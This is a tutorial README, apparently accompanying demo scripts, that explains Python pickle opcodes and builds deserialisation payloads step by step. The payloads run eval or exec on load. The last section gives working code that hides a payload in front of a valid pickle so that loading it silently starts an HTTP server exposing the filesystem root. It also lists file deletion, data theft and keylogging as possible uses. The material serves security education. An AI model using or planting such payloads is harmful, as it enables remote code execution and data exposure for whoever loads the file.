# Loading an altered pickle payload

## Overview

It is possible to execute malicious code on a machine that un-pickles a
carefully crafted payload.

## Understanding the pickle process

### Serialising and deserialising

By calling `pickle.dump(file, something)` or `pickle.dumps(something)` a binary
string is created that holds a series of instructions on how to recreate the
object or value being passed for serialisation.

During deserialisation (`pickle.load` / `pickle.loads`) these instructions work
on a virtual stack and a virtual memory bank. Each operation either introduces,
operates, reduces data into the stack/memory or calls a function. There is also
a stop operation that halts the entire operation.

In a sense you could say that pickle is its own mini virtual machine.

### The pickle format

When serialising with pickle there is the possibility of specifying the
serialisation protocol that can be used.

Let's assume you have the following code:

```Python
import pickle

# 254 = 0xFE in hexadecimal <- remember
data0 = pickle.dumps(254, protocol=0)
data1 = pickle.dumps(254, protocol=1)
data2 = pickle.dumps(254, protocol=2)
data3 = pickle.dumps(254, protocol=3)
data4 = pickle.dumps(254)  # protocol 4
```

The protocols range from 0 to 4, from human readable to mostly bytes, or not
human readable.

The previous code will generate pickled data in the following ways for a given
protocol:

- data0 (proto 0) → `b'I254\n.'`
- data1 (proto 1) → `b'K\xfe.'`
- data2 (proto 2) → `b'\x80\x02K\xfe.'`
- data3 (proto 3) → `b'\x80\x03K\xfe.'`
- data4 (proto 4) → `b'\x80\x04K\xfe.'`

Notice that each protocol has a few elements:

- possibly a header indicating the protocol version clearly
- a chain of operations
- the STOP opcode `.`. If this were omitted the load would throw an
  **EOFError**.

The existence of the protocol version header exists mainly in newer protocols
like 2, 3 and 4.

But then the question arises _**When deserialising how does pickle know how to
distinguish between protocols 0 and 1 ?!**_

Haha! I am glad you asked! Well there are some differences:

- the opcodes are completely different between protocol 0 and 1
- values are represented differently in protocol 0 vs 1, meaning that in
  protocol 1 they are mainly represented with hex values.

The pickle deserialiser knows to spot these differences.

You can run `01_01_opcodes.py` to see all the operation codes that are available
for each protocol, accompanied by a small description of their function.

You can see the full description of all the opcodes in protocol 0 by running
`01_02_opcodes_for_p0.py`.

### Disassembly of a serialised instance

In script `02_disassembly_pickle_data_of_simple_class.py` we have a class:

```python
class X:
    pass
```

If we look at the serialised data it is something like:

`b'ccopy_reg\n_reconstructor\np0\n(c__main__\nX\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n.'`.

Since it has newlines let us print it.

```
ccopy_reg
_reconstructor
p0
(c__main__
X
p1
c__builtin__
object
p2
Ntp3
Rp4
.
```

There we go, a bit more readable. We can already notice the pattern explained
earlier where you have an operation code and then some optional data that it can
work with (depending on the operation).

We can get this in an even more readable form by aplying `pickletools.optimize`
and `pickletools.dis` over the binary string.

The `optimize` simply removes unused PUT operations.

The result is:

```
0: c    GLOBAL     'copy_reg _reconstructor'
25: (    MARK
26: c        GLOBAL     '__main__ X'
38: c        GLOBAL     '__builtin__ object'
58: N        NONE
59: t        TUPLE      (MARK at 25)
60: R    REDUCE
61: .    STOP
highest protocol among opcodes = 0
```

So far we notice:

- **c** - GLOBAL → push some module on to the stack
- **p** - PUT → store the top of the stack to the memory
- **(** - MARK → start a sort of "code block" called a _**markobject**_
- **N** - put NONE on the stack
- **t** - TUPLE → pop stuff from stack until a MARK is hit, and save it into a
  tuple inserted on the stack
- **R** - REDUCE → pop an args data structure and a callable, puts on the stack
  the `callable(*args)` result
- **.** - STOP → end the deserialisation by returning the top of the stack as a
  result

#### Explanation of the software within the payload

1. Load the `copyreg._reconstructor` onto the stack (`copy_reg` was renamed to
   `copyreg` in Python 3 and pickle knows this; the function has the role of
   recreating an instance as an utility function accompanying the pickle
   library)
2. Start a markobject on the stack
3. Load `__main__.X` class onto the stack
4. Load `__builtin__.object` class onto the stack
5. Push `None` onto the stack
6. Create a tuple with everything from the stack up to the first encounter of a
   markobject. That includes the None, the object class and the X class. All of
   those are popped out of the stack, including the markobject. A tuple
   `(X, object, None)` is added on top of the stack
7. Reduce by popping one item from the stack as an args list and another one as
   a callable. In our case the `(X, object, None)` is the args structure and
   `copyreg._reconstructor` is the callable. It pushes onto the stack
   `copyreg._reconstructor(*(X, object, None))`.
8. Halt the process by returning the instance recreated in the last step.

### Closer look at opcodes

If we look at the opcodes list for protocol 0 again we notice that there are the
following classes of opcodes:

- loading data (INT, LONG, STRING, NONE, UNICODE, FLOAT)
- declaring data structures (LIST, TUPLE, DICT)
- operate with data structues (APPEND, SETITEM)
- operate on the stack directly (POP, DUP, MARK)
- operate with the memory bank (GET, PUT)
- load global objects onto the stack (GLOBAL)
- specialized operations over the stack (REDUCE, BUILD, INST, STOP)
- others (PERSID)

## Crafting a payload

Now that we understand what some of the opcodes are for and how a payload is
deserialised let us craft a malicious payload that will execute some arbitrary
code upon deserialisation.

What do we know so far?

- we can execute a function with `R` (REDUCE)
- we can load values, especially strings
- we can declare argument lists with `(` (MARK) and `TUPLE`

For the rest of this section we will show the payload in disassembled format as
well as in serialized format.

### Calling sum with an empty list

Let us call the sum function

```
GLOBAL __builtin__.sum
MARK  # create a mark for the args  
  MARK  # create a mark for an empty list
    LIST  # generate the list on the stack
  TUPLE  # generate the args (contains the previous empty list)
REDUCE  # call sum with the empty list
STOP
```

The above would be equivalent of:

```
sum_f = __builtin__.sum
some_list = []
args = (some_list,)
result = sum_f(*args)
```

serialised:

```python
print(pickle.loads(b'c__builtin__\nsum\n((ltR.'))  
# prints 0
```

### Calling sum with some numbers

Let's say we want to add some numbers.

```
GLOBAL __builtin__.sum
MARK  # create a mark for the args  
  MARK  # create a mark a list of numbers
    INT 11
    INT 22
    LIST
  TUPLE
REDUCE
STOP
```

serialised

```python
print(pickle.loads(b'c__builtin__\nsum\n((I11\nI22\nltR.'))  
# prints 33
```

### Calling sum with some numbers appended to the list

Let's say we want to add the numbers after the list was created.

```
GLOBAL __builtin__.sum
MARK
  MARK
    LIST
  I11
  a
  I22
  a
  TUPLE
REDUCE
STOP
```

serialised:

```Python
print(pickle.loads(b'c__builtin__\nsum\n((lI11\naI22\natR.'))  
# prints 33
```

### Print a string

```
GLOBAL __builtin__.print
MARK
  UNICODE 'Salve mundus!'
  TUPLE
REDUCE
STOP
```

serialised:

```python
pickle.loads(b'c__builtin__\nprint\n(VSalve mundus!\ntR.')
# prints 'Salve mundus!'
```

### Calling code expressions with `eval`

While it is fun to craft these payloads we actually want to write any code and
write it directly as Python. For this purpose we will pass the python code
directly to eval

```
GLOBAL __builtin__.eval
MARK
  UNICODE 'print("Salve mundus!")'
  TUPLE
REDUCE
STOP
```

Let's write it in code

```Python
malicious_code = 'print("Salve mundus!")'
malicious_string = f"c__builtin__\neval\n(V{malicious_code}\ntR."
malicious_bytes = malicious_string.encode()
pickle.loads(malicious_bytes)
# prints 'Salve mundus!'
```

You can run `03_malicious_run.py` for a demo of this.

### More and better organised malicious code with `exec`

Now the problem with eval is that it runs only single line expressions and it
can be troublesome if you want to run a whole recipe of dangerous code. For this
purpose we will write all our code as we would write a python script and then
encode this code as part of a payload.

```
GLOBAL __builtin__.exec
MARK
  UNICODE 'def evil_function():\u000a    print("Salve mundus!")\u000aevil_function()'
  TUPLE
REDUCE
STOP
```

or in code:

```python
EVIL_STUFF = """
def evil_function():
    print("Salve mundus!")

evil_function()  # auto-call function → otherwise said: make it execute
"""

PICKLE_NEWLINE = "\\u000a"

normalised_evil_stuff = EVIL_STUFF.replace('\n', PICKLE_NEWLINE)
malicious_string = f"c__builtin__\nexec\n(V{normalised_evil_stuff}\ntR."
malicious_bytes = malicious_string.encode()
pickle.loads(malicious_bytes)
# prints 'Salve mundus!'
```

Run `04_advanced_malicious_run.py` for a demo.

Now we could potentially write some really offensive code in the
`evil_function`.

We could:

- delete files
- copy confidential information and send it to some server, email or online
  storage
- create a separate process or thread that listens for keypresses (keylogger)
- start a backdoor server and allow a us to connect and run some manual
  malicious shell commands

## Attach a concealed backdoor server in a valid payload

Let's assume our legit payload is:

```
I123
STOP
```

We could attach a backdoor server as such:

```python
EVIL_STUFF = """
import os
import time

os.popen("python -m http.server 5678 --directory / &")
time.sleep(0.2)
"""

payload = b'I123\n.'
PICKLE_NEWLINE = "\\u000a"
normalised_evil_stuff = EVIL_STUFF.replace('\n', PICKLE_NEWLINE)
malicious_string = (
    f"c__builtin__\nexec\n(V{normalised_evil_stuff}\ntR0"
)
evil_payload = malicious_string.encode() + payload
```

now if you were to call `pickle.loads(evil_payload)` you would get `123` and as
a bonus you would have a process spawned in the background with a backdoor file
listing server, showing all the contents of the root.

You can run `05_attach_backdoor_to_usual_payload.py` for a demo. The backdoor
server automatically stops after 20 seconds.
